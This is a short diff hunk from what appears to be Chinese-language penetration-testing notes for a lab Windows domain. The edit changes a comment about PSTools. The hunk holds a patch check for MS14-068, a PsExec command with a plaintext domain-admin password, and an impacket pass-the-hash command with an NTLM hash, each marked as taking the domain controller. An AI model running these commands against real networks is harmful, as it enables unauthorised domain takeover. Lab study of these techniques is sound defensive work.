@@ -204,7 +204,7 @@ wmic qfe get hotfixid | findstr KB3011780 # 无补丁  则 ms14-068 提权
 ## 攻击
 
 ```shell
-# PSTools 使用哈希传递(PTH)攻击 https://mp.weixin.qq.com/s/6BYAeo-5I1XMejyC5ec1pw
+# PSTools .exe只支持明文 使用哈希传递(PTH)攻击 https://mp.weixin.qq.com/s/6BYAeo-5I1XMejyC5ec1pw
 PsExec.exe \\192.168.52.138 -u god\administrator -p hongrisec@2022 -s cmd #成功，拿下域控了。
 # impact: pip install impacket, win下pyexec用对应的py文件 python psexec.py xxxxxxx
 psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138 #成功，拿下域控了。
